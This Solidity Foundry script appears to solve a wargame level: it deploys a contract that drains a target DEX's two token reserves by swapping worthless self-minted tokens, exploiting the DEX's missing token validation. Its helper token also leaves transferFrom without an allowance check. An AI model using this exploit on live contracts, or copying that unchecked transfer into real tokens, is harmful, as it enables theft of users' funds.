// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Dex2Solution is Script {
    address target = 0x5E0fCa34a1A8753E67090438cC4094113AaCe104;

    function run() external {
        vm.startBroadcast();
        new Hack(IDex(target));
        vm.stopBroadcast();
    }
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract Hack {
    constructor(IDex dex) {
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        MyToken myToken1 = new MyToken();
        MyToken myToken2 = new MyToken();

        myToken1.mint(address(this), 2);
        myToken2.mint(address(this), 2);

        myToken1.transfer(address(dex), 1);
        myToken2.transfer(address(dex), 1);

        myToken1.approve(address(dex), type(uint256).max);
        myToken2.approve(address(dex), type(uint256).max);

        dex.swap(address(myToken1), address(token1), 1);
        dex.swap(address(myToken2), address(token2), 1);

        require(token1.balanceOf(address(this)) == 100, "Token1 balance is not 100");
        require(token2.balanceOf(address(this)) == 100, "Token2 balance is not 100");
    }
}

contract MyToken is ERC20 {
    constructor() ERC20("My-Token", "MT") {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) public {
        _burn(from, amount);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        return true;
    }
}
